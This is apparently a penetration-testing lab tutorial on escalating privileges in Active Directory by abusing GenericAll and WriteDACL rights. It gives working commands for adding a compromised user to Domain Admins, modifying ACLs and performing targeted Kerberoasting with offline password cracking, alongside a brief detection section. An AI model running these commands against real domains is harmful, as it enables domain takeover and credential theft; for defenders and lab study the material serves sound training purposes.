<summary> DACL/ACL-Based Escalation (GenericAll / WriteDACL / WriteProperty)</summary>
 <br> 
In Active Directory (AD), a DACL (Discretionary Access Control List) is a component of an object‚Äôs security descriptor. It specifies which users or groups are allowed (or denied) access to the object and what actions they are permitted to perform. It essentially controls who can do what to an object. Such as a user account, computer, group, or any other directory object.
If you (or a compromised account) have ACL rights like GenericAll, WriteDACL, or WriteProperty over another AD object (user, group, OU, computer), you can modify permissions or credentials to escalate privileges 
Generic ALL Right
In Active Directory, permissions and privileges define what actions an entity (user, group, or computer) can perform on another object. The ‚ÄúGeneric ALL‚Äù privilege is one of the most powerful in AD because it grants complete control over the target object. This means that the user or group with this privilege can:

Modify any attribute of the object
Reset passwords
Add or remove members from groups
Delegate further control to other users
Delete the object altogether
Because of its extensive reach, an attacker who gains ‚ÄúGeneric ALL‚Äù privileges on sensitive objects (like privileged groups or service accounts) can essentially gain domain dominance.

Exploiting ‚ÄúGeneric ALL‚Äù Privilege
Here‚Äôs how an attacker can leverage the ‚ÄúGeneric ALL‚Äù privilege to compromise Active Directory:

Identifying Targets with ‚ÄúGeneric ALL‚Äù Privilege
The first step is to identify objects where the attacker has this privilege. This can be done using tools like BloodHound or PowerView, which map out Active Directory and show privilege relationships. Once identified, the attacker can choose their target based on the potential impact (e.g., a Domain Admin account).
Resetting Passwords
If the ‚ÄúGeneric ALL‚Äù privilege is applied to a user account, the attacker can reset the account‚Äôs password. This is particularly devastating if the account is for a privileged user, such as a Domain Administrator. After resetting the password, the attacker can log in as that user and gain full control over the domain.
Modifying Group Membership
If the ‚ÄúGeneric ALL‚Äù privilege is applied to a group, the attacker can add themselves to a high-privilege group, like Domain Admins or Enterprise Admins. This grants them the privileges of those groups, effectively giving them control over the entire domain.
Abusing Delegated Control
With the ‚ÄúGeneric ALL‚Äù privilege, the attacker can delegate control of the target object to another user or group. This allows them to grant privileges to themselves or other malicious users without raising suspicion immediately.
Deleting or Modifying Objects
In extreme cases, an attacker with ‚ÄúGeneric ALL‚Äù can delete critical objects, such as service accounts or privileged users, causing operational disruptions or creating avenues for further exploitation.
üîç Detection

Use BloodHound to detect privileged edges (WriteDacl, GenericAll).

Run PowerView:

powershell

    Get-ObjectAcl -SamAccountName TargetUser -ResolveGUIDs
Filter for rights: GenericAll, WriteDacl, etc. 

‚öôÔ∏è Exploitation
Use PowerView/Powermad:

powershell

    Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity "LowPrivUser" -Rights All
Then add yourself to Domain Admins or reset passwords.
Exploitation Phase I ‚Äì User Own Generic All Right for Group
Compromised User: Komal

Target Account: Domain Admin Group

Now that the lab is set up, let‚Äôs walk through how an attacker (acting as Komal) can abuse the Generic ALL privilege.

Assuming the Red Teamer knows the credential for Komal Users as a Standard Domain Users and would like to enumerate the other Domain users & Admin members with the help of ‚Äúnet-rpc‚Äù Samba command line Utility.

net rpc user -U ignite.local/komal%'Password@1' -S 192.168.1.8
net rpc group members "Domain Admins" -U ignite.local/komal%'Password@1' -S 192.168.1.8
After executing above command its has been concluded that the Administrator users is only the single member of the Admin group. Unfortunately, the tester is doesn‚Äôt know the credentials of administrator.



Bloodhound -Hunting for Weak Permission
Use BloodHound to Confirm Privileges: You can use BloodHound to verify that Komal has the Generic ALL right on the Domain Admins group.

bloodhound-python -u komal -p Password@1 -ns 192.168.1.8 -d ignite.local -c All
Generic ALL Active Directory Abuse

From the graphical representation of Bloodhound, the tester would like to identify the outbound object control for selected user where the first degree of object control value is equal to 1.



Thus it has shown the Komal User has Generic ALL privilege to Domain Admin group and provided steps for exploitation to be proceed.

Generic ALL Active Directory Abuse

Method for Exploitation ‚Äì Account Manipulation (T1098)
1. Linux Net RPC ‚Äì Samba
The tester can abuse this permission by Komal User into Domain Admin group and list the domain admin members to ensure that Komal Users becomes Domain Admin.

net rpc group addmem "Domain Admins" "komal" -U ignite.local/komal%'Password@1' -S 192.168.1.8


2. Linux Bloody AD
bloodyAD --host "192.168.1.8" -d "ignite.local" -u "komal" -p "Password@1" add groupMember "Domain Admins" "komal"


Thus, from the user property we can see Komal user has become a member of domain admin.

Generic ALL Active Directory Abuse

3. Windows Net command
net group "domain admins" komal /add /domain


Exploitation Phase II ‚Äì User‚Äôs own generic Right for another user
To set up a lab environment where the user Nishant has Generic ALL rights over the user Vipin, you‚Äôll need to follow several steps. This process involves configuring Active Directory (AD) permissions so that Nishant can manipulate attributes of the Vipin account.

Step 1: Create Two AD user accounts
net user vipin Password@1 /add /domain
net user nishant Password@1 /add /domain
                

Step 2: Assign Generic ALL Permissions
Open Active Directory Users and Computers.
Navigate to the Vipin user account.
Right-click on Vipin, select Properties.
                Generic ALL Active Directory Abuse

Go to the Security tab.
Click Advanced and then Add.
                

In the ‚ÄúEnter the object name to select‚Äù box, type Nishant and click Check Names.
After adding Nishant, set the permissions:
Check Generic All in the permissions list (you may need to select Full Control to encompass all rights).
                

Ensure Applies to is set to This object only.
                Generic ALL Active Directory Abuse

Bloodhound -Hunting for Weak Permissions
Hunting for First Degree objection Control for Nishant Users as we did in previous steps

bloodhound-python -u nishant -p Password@1 -ns 192.168.1.8 -d ignite.local -c All


From the graph, it can be observed that the Nishant user owns generic all privileges on Vipin user

Generic ALL Active Directory Abuse

Moreover, Bloodhound also helps the pentest to define the possible attack from the user account nishant, this user can perform domain attack such as keroasting and shadow credentials



Multiple Methods for Exploitation
1. T1558.003 ‚Äì Kerberoasting
1.1  Linux Python Script ‚Äì TargetedKerberoast
Compromised User: Nishant: Password@123

Target User: Vipin

Kerberoasting is an attack technique that targets service accounts in Active Directory environments, where an attacker with Generic ALL permissions on a user can exploit the ability to request service tickets (TGS). By requesting TGS for service accounts, the attacker can obtain encrypted tickets that include the service account‚Äôs password hash. Since these tickets can be extracted and then offline cracked, the attacker can potentially gain access to the service account‚Äôs credentials. The attack leverages the fact that service accounts typically have elevated privileges, allowing the attacker to escalate their own access within the network once the password is cracked. This exploitation is particularly effective in environments where weak or easily guessable passwords are used for service accounts.

Cloning the Targeted Kerberoast Tool
To perform this attack, first, clone the targetedKerberoast repository from GitHub using the following command:

git clone https://github.com/ShutdownRepo/targetedKerberoast.git
Generic ALL Active Directory Abuse

./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1'
As we have seen during the lab setup, the vipin user was added as a domain user account, which does not have any associated SPN. The Python script has modified the attribute of vipin user to set the SPN name and then dump Krbtgs hash that can be brute-forced offline. Moreover, the script performs a clear track step by removing the SPN well live from the user attribute.

This type of attack is ideally best when the attacker is not willing to change the password for the target user <Vipin in our case>, even generic all privilege is enabled for the compromised user. Yes, this step is less noisy than changing the password of any user.



Further, with the help of John the Ripper and a dictionary such as Rock You can help the attacker to brute force the weak password.

Generic ALL Active Directory Abuse

1.2 Windows PowerShell Script-PowerView
To perform Kerberoasting using PowerView on a Windows machine, you can leverage PowerView‚Äôs ability to enumerate Active Directory service accounts that have Service Principal Names (SPNs). These SPNs can be requested to obtain service tickets (TGS), which can then be cracked offline to reveal the service account‚Äôs credentials. Here‚Äôs a brief overview of the steps:

Make sur that the target account has no SPN and then Set the SPN to obtain the KerbTGS hash
Get-DomainUser 'vipin' | Select serviceprincipalname
Set-DomainObject -Identity 'vipin' -Set @{serviceprincipalname='nonexistent/hackingarticles'}
$User = Get-DomainUser 'vipin'
$User | Get-DomainSPNTicket | f1
